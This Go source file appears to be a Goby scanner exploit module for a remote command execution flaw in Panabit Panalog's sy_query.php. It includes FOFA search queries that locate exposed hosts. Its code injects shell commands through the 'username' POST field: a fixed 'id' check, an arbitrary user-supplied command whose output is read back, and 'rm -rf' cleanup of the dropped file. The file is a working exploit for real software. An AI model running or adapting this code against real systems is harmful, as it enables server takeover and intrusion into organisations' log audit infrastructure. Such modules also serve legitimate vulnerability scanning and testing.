package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Panabit Panalog sy_query.php RCE",
    "Description": "<p>Panalog is a log audit system, which is convenient for users to centrally monitor and manage massive Panabit devices on the network.</p><p>Panalog log audit system sy_query.php file has a remote command execution vulnerability. Attackers can execute arbitrary commands to take over server permissions.</p>",
    "Impact": "<p>Panabit Panalog sy_query.php RCE</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.panabit.com\">https://www.panabit.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Panabit-Panalog",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution",
        "Information technology application innovation industry"
    ],
    "Translation": {
        "CN": {
            "Name": "Panalog 日志审计系统 sy_query.php 文件远程命令执行漏洞",
            "Product": "Panabit-Panalog",
            "Description": "<p>Panalog是一款日志审计系统，方便用户统一集中监控、管理在网的海量设备。</p><p>Panalog日志审计系统 sy_query.php文件存在远程命令执行漏洞，攻击者可执行任意命令，接管服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://www.panabit.com\">https://www.panabit.com</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>Panalog日志审计系统 sy_query.php文件存在远程命令执行漏洞，攻击者可执行任意命令，接管服务器权限。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "信创"
            ]
        },
        "EN": {
            "Name": "Panabit Panalog sy_query.php RCE",
            "Product": "Panabit-Panalog",
            "Description": "<p>Panalog is a log audit system, which is convenient for users to centrally monitor and manage massive Panabit devices on the network.</p><p>Panalog log audit system sy_query.php file has a remote command execution vulnerability. Attackers can execute arbitrary commands to take over server permissions.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.panabit.com\">https://www.panabit.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Panabit Panalog sy_query.php RCE</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "Information technology application innovation industry"
            ]
        }
    },
    "FofaQuery": "((body=\"id=\\\"codeno\\\"\" && body=\"日志系统\") || title=\"panalog\")",
    "GobyQuery": "((body=\"id=\\\"codeno\\\"\" && body=\"日志系统\") || title=\"panalog\")",
    "Author": "1291904552@qq.com",
    "Homepage": "http://www.panabit.com/",
    "DisclosureDate": "2021-10-20",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [
            "Panalog"
        ],
        "Hardware": []
    },
    "CVSSScore": "9.8",
    "PostTime": "2023-08-06",
    "PocId": "10233"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomStr := goutils.RandomHexString(8)
			uri_1 := "/account/sy_query.php"
			cfg_1 := httpclient.NewPostRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			cfg_1.FollowRedirect = false
			cfg_1.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg_1.Data = "username=;id>" + randomStr + ".txt"
			if resp, err := httpclient.DoHttpRequest(u, cfg_1); err == nil {
				if resp.StatusCode == 200 {
					uri_2 := "/account/" + randomStr + ".txt"
					cfg_2 := httpclient.NewGetRequestConfig(uri_2)
					cfg_2.VerifyTls = false
					cfg_2.FollowRedirect = false
					cfg_2.Header.Store("Content-type", "application/x-www-form-urlencoded")
					if resp2, err := httpclient.DoHttpRequest(u, cfg_2); err == nil {
						if resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "uid") {
							uri_3 := "/account/sy_query.php"
							cfg_3 := httpclient.NewPostRequestConfig(uri_3)
							cfg_3.VerifyTls = false
							cfg_3.FollowRedirect = false
							cfg_3.Header.Store("Content-type", "application/x-www-form-urlencoded")
							cfg_3.Data = "username=;rm%20-rf%20" + randomStr + ".txt"
							httpclient.DoHttpRequest(u, cfg_3)
							return true
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := strings.Replace(ss.Params["cmd"].(string), " ", "%20", -1)
			randomStr := goutils.RandomHexString(8)
			uri_1 := "/account/sy_query.php"
			cfg_1 := httpclient.NewPostRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			cfg_1.FollowRedirect = false
			cfg_1.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg_1.Data = "username=;" + cmd + ">" + randomStr + ".txt"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_1); err == nil {
				if resp.StatusCode == 200 {
					uri_2 := "/account/" + randomStr + ".txt"
					cfg_2 := httpclient.NewGetRequestConfig(uri_2)
					cfg_2.VerifyTls = false
					cfg_2.FollowRedirect = false
					cfg_2.Header.Store("Content-type", "application/x-www-form-urlencoded")
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_2); err == nil {
						uri_3 := "/account/sy_query.php"
						cfg_3 := httpclient.NewPostRequestConfig(uri_3)
						cfg_3.VerifyTls = false
						cfg_3.FollowRedirect = false
						cfg_3.Header.Store("Content-type", "application/x-www-form-urlencoded")
						cfg_3.Data = "username=;rm%20-rf%20" + randomStr + ".txt"
						httpclient.DoHttpRequest(expResult.HostInfo, cfg_3)
						expResult.Output = resp2.RawBody
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
